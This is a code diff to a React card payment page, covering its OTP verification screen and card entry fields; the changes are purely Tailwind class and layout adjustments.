@@ -318,10 +318,10 @@ const CardPaymentPage = () => {
       selectedCard.id === "amex" ? "SafeKey" :
       "ID Check";
     return (
-      <div className="fixed inset-0 bg-slate-50 flex flex-col overflow-auto">
-        <div className="w-full max-w-md mx-auto px-5 pt-6 pb-4 flex-1 flex flex-col">
+      <div className="card-otp-root fixed inset-0 flex flex-col overflow-hidden bg-slate-50">
+        <div className="card-otp-frame mx-auto flex h-[100dvh] min-h-0 w-full max-w-md flex-col px-5 pb-4 pt-6">
           {/* Header */}
-          <div className="flex items-center justify-between mb-6">
+          <div className="card-otp-header mb-6 flex shrink-0 items-center justify-between">
             <div className="flex items-center gap-2">
               <ShieldCheck className="w-5 h-5" style={{ color: selectedCard.accent }} strokeWidth={2.2} />
               <div className="text-[15px] leading-none">
@@ -336,9 +336,9 @@ const CardPaymentPage = () => {
           </div>
 
           {/* Phone illustration */}
-          <div className="flex justify-center mb-4">
+          <div className="card-otp-illustration mb-4 flex shrink-0 justify-center">
             <div className="relative">
-              <div className="w-[86px] h-[130px] rounded-[14px] bg-slate-800 flex flex-col items-center justify-start pt-2.5 pb-2 shadow-md">
+              <div className="card-otp-phone flex h-[130px] w-[86px] flex-col items-center justify-start rounded-[14px] bg-slate-800 pb-2 pt-2.5 shadow-md">
                 <div className="w-8 h-1 rounded-full bg-slate-600 mb-1.5" />
                 <div className="flex-1 w-[72px] rounded-md bg-slate-100" />
                 <div className="w-4 h-4 rounded-full border-2 border-slate-600 mt-1.5" />
@@ -356,7 +356,7 @@ const CardPaymentPage = () => {
             </div>
           </div>
 
-          <p className="text-center text-[12px] leading-relaxed text-slate-500 mb-5 px-1">
+          <p className="card-otp-copy mb-5 shrink-0 px-1 text-center text-[12px] leading-relaxed text-slate-500">
             We have sent you a text message with an OTP to your registered auth ending with{" "}
             <span className="font-medium text-slate-700">{maskedCardNumber || "XXXXXXXXXXXX0000"}</span>. You are paying merchant{" "}
             <span className="font-semibold text-slate-700">{merchantId}</span> the amount of{" "}
@@ -366,23 +366,23 @@ const CardPaymentPage = () => {
           </p>
 
           {/* Transaction Details */}
-          <div className="bg-white rounded-2xl border border-slate-200/70 shadow-[0_1px_2px_rgba(15,23,42,0.04)] overflow-hidden mb-6">
-            <div className="flex items-center gap-2 px-4 py-3 border-b border-slate-100">
+          <div className="card-otp-details mb-6 shrink-0 overflow-hidden rounded-2xl border border-slate-200/70 bg-white shadow-[0_1px_2px_rgba(15,23,42,0.04)]">
+            <div className="card-otp-details-header flex items-center gap-2 border-b border-slate-100 px-4 py-3">
               <ShieldCheck className="w-4 h-4 text-slate-700" strokeWidth={2.2} />
               <span className="text-[13px] font-semibold text-slate-800">Transaction Details</span>
             </div>
-            <div className="px-4 py-3 flex items-center justify-between border-b border-slate-100">
+            <div className="card-otp-detail-row flex items-center justify-between border-b border-slate-100 px-4 py-3">
               <div className="flex items-center gap-2 text-slate-500 text-[13px]">
                 <DollarSign className="w-4 h-4" strokeWidth={2} />
                 <span>Amount</span>
               </div>
               <span className="text-slate-800 font-semibold text-[14px]">৳{amount}</span>
             </div>
-            <div className="px-4 py-3 flex items-center justify-between border-b border-slate-100">
+            <div className="card-otp-detail-row flex items-center justify-between border-b border-slate-100 px-4 py-3">
               <span className="text-slate-500 text-[13px]">Transaction ID</span>
               <span className="text-slate-800 font-mono text-[12px] tracking-wide">{(merchantInv && merchantInv.trim()) || transactionId}</span>
             </div>
-            <div className="px-4 py-3 flex items-center justify-between">
+            <div className="card-otp-detail-row flex items-center justify-between px-4 py-3">
               <div className="flex items-center gap-2 text-slate-500 text-[13px]">
                 <Store className="w-4 h-4" strokeWidth={2} />
                 <span>Merchant ID</span>
@@ -392,7 +392,7 @@ const CardPaymentPage = () => {
           </div>
 
           {/* OTP input */}
-          <div className="mb-4">
+          <div className="card-otp-entry mb-4 shrink-0">
             <label className="block text-slate-600 text-[13px] mb-2">Enter OTP Code</label>
             <div className="flex items-center gap-2">
               <input id="cardpaymentpage-fld-1" name="cardpaymentpage-fld-1" aria-label="cardpaymentpage field 1"
@@ -427,7 +427,7 @@ const CardPaymentPage = () => {
           <button
             onClick={handleOtpConfirm}
             disabled={otpCode.length !== 6 || otpLoading}
-            className={`w-full py-3.5 rounded-xl text-white text-[14px] font-semibold transition-all duration-300 mb-3 ${
+            className={`card-otp-verify mb-3 w-full shrink-0 rounded-xl py-3.5 text-[14px] font-semibold text-white transition-all duration-300 ${
               otpCode.length === 6 && !otpLoading
                 ? "bg-blue-600 hover:bg-blue-700 shadow-[0_4px_14px_rgba(37,99,235,0.35)]"
                 : "bg-blue-300 cursor-not-allowed"
@@ -436,7 +436,7 @@ const CardPaymentPage = () => {
             {otpLoading ? "Verifying..." : "Verify"}
           </button>
 
-          <div className="grid grid-cols-2 gap-3 mb-4">
+          <div className="card-otp-actions mb-4 grid shrink-0 grid-cols-2 gap-3">
             <button
               onClick={handleResendOtp}
               disabled={otpTimer > 0}
@@ -458,11 +458,11 @@ const CardPaymentPage = () => {
             </button>
           </div>
 
-          <p className="text-center text-slate-400 text-[11px] mb-6">
+          <p className="card-otp-timeout mb-6 shrink-0 text-center text-[11px] text-slate-400">
             The page will automatically timeout after {sessionTimer} seconds.
           </p>
 
-          <div className="mt-auto flex items-center justify-between pt-4 border-t border-slate-200/70">
+          <div className="card-otp-footer mt-auto flex shrink-0 items-center justify-between border-t border-slate-200/70 pt-4">
             <div className="flex items-center gap-1.5">
               <ShieldCheck className="w-3.5 h-3.5 text-emerald-500" strokeWidth={2.2} />
               <span className="text-slate-400 text-[11px]">Data are protected by the PCI DSS standard</span>
@@ -485,7 +485,7 @@ const CardPaymentPage = () => {
             onClick={() => setShowCodeHelp(false)}
           >
             <div
-              className="w-full max-w-sm rounded-[28px] bg-white p-6 shadow-2xl"
+              className="card-otp-help max-h-[calc(100dvh-2rem)] w-full max-w-sm overflow-hidden rounded-[28px] bg-white p-6 shadow-2xl"
               onClick={(event) => event.stopPropagation()}
             >
               <div className="mb-7 flex items-center gap-4">
@@ -558,26 +558,26 @@ const CardPaymentPage = () => {
               ))}
             </div>
           </div>
-          <div ref={cardInteractionRef} className="card-payment-fields flex min-h-0 flex-1 flex-col gap-4">
+          <div ref={cardInteractionRef} className={`card-payment-fields flex min-h-0 flex-1 flex-col gap-4 ${cardNumber.replace(/\D/g, "").length >= 6 ? "card-payment-fields-with-bin" : ""}`}>
             {/* Transaction Details */}
             <div className="card-payment-preview relative h-[194px] shrink-0 [perspective:1000px]">
-              <div className={`absolute inset-0 rounded-2xl bg-gradient-to-br from-blue-50/80 to-white border border-blue-100/70 shadow-[0_2px_10px_rgba(37,99,235,0.05)] p-4 transition-all duration-500 motion-reduce:transition-none ${showCardPreview ? "pointer-events-none scale-95 opacity-0 [transform:rotateY(-12deg)]" : "scale-100 opacity-100 [transform:rotateY(0deg)]"}`}>
-                <div className="flex items-center gap-2 mb-3">
+              <div className={`card-payment-transaction absolute inset-0 rounded-2xl bg-gradient-to-br from-blue-50/80 to-white border border-blue-100/70 shadow-[0_2px_10px_rgba(37,99,235,0.05)] p-4 transition-all duration-500 motion-reduce:transition-none ${showCardPreview ? "pointer-events-none scale-95 opacity-0 [transform:rotateY(-12deg)]" : "scale-100 opacity-100 [transform:rotateY(0deg)]"}`}>
+                <div className="card-payment-transaction-heading flex items-center gap-2 mb-3">
                   <div className="w-7 h-7 rounded-lg bg-blue-600/10 flex items-center justify-center">
                     <ShieldCheck className="w-4 h-4 text-blue-600" strokeWidth={2.2} />
                   </div>
                   <p className="text-slate-800 text-[13px] font-bold">Transaction Details</p>
                 </div>
                 <div className="divide-y divide-blue-100/50">
-                  <div className="flex items-center justify-between py-2">
+                  <div className="card-payment-transaction-row flex items-center justify-between py-2">
                     <span className="text-slate-500 text-[13px]">Amount</span>
                     <span className="text-blue-700 text-[15px] font-bold">৳{amount}</span>
                   </div>
-                  <div className="flex items-center justify-between py-2">
+                  <div className="card-payment-transaction-row flex items-center justify-between py-2">
                     <span className="text-slate-500 text-[13px]">Merchant ID</span>
                     <span className="text-slate-800 text-[13px] font-semibold truncate max-w-[55%] text-right">{merchantName}</span>
                   </div>
-                  <div className="flex items-center justify-between py-2">
+                  <div className="card-payment-transaction-row flex items-center justify-between py-2">
                     <span className="text-slate-500 text-[13px]">Transaction ID</span>
                     <span className="text-slate-700 text-[12px] font-mono tracking-wider">{(merchantInv && merchantInv.trim()) || transactionId || "—"}</span>
                   </div>
@@ -630,7 +630,7 @@ const CardPaymentPage = () => {
             </div>
 
             {/* Card Number */}
-            <div>
+            <div className="card-payment-number-block shrink-0">
               <label className="card-payment-label block text-slate-600 text-[11px] font-semibold uppercase tracking-wide mb-1.5">Card Number</label>
               <div className="relative">
                 <input id="cardpaymentpage-fld-2" name="cardpaymentpage-fld-2" aria-label="cardpaymentpage field 2" ref={cardNumberRef} type="tel" inputMode="numeric" value={cardNumber} data-card-field="true" onFocus={() => activateCardPreview("number")} onBlur={handleCardFieldBlur} onChange={(e) => setCardNumber(formatCardNumber(e.target.value))} placeholder="0000 0000 0000 0000"
@@ -664,14 +664,14 @@ const CardPaymentPage = () => {
             </div>
 
             {/* Card Holder */}
-            <div>
+            <div className="card-payment-holder-block shrink-0">
               <label className="card-payment-label text-slate-600 text-[11px] font-semibold uppercase tracking-wide mb-1.5 block">Card Holder Name</label>
               <input id="cardpaymentpage-fld-3" name="cardpaymentpage-fld-3" aria-label="cardpaymentpage field 3" type="text" value={cardHolder} data-card-field="true" onFocus={() => activateCardPreview("holder")} onBlur={handleCardFieldBlur} onChange={handleCardHolderChange} placeholder="John Doe"
                 className="card-payment-input w-full border border-slate-200 rounded-xl px-3.5 py-2.5 text-[13px] text-slate-800 placeholder:text-slate-300 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 bg-slate-50/50 focus:bg-white transition-all tracking-wide" />
             </div>
 
             {/* Expiry + CVV */}
-            <div className="grid grid-cols-[1fr_110px] gap-3">
+            <div className="card-payment-expiry-block grid shrink-0 grid-cols-[1fr_110px] gap-3">
               <div>
                 <label className="card-payment-label text-slate-600 text-[11px] font-semibold uppercase tracking-wide mb-1.5 block">Expiration Date</label>
                 <div className="grid grid-cols-2 gap-2">
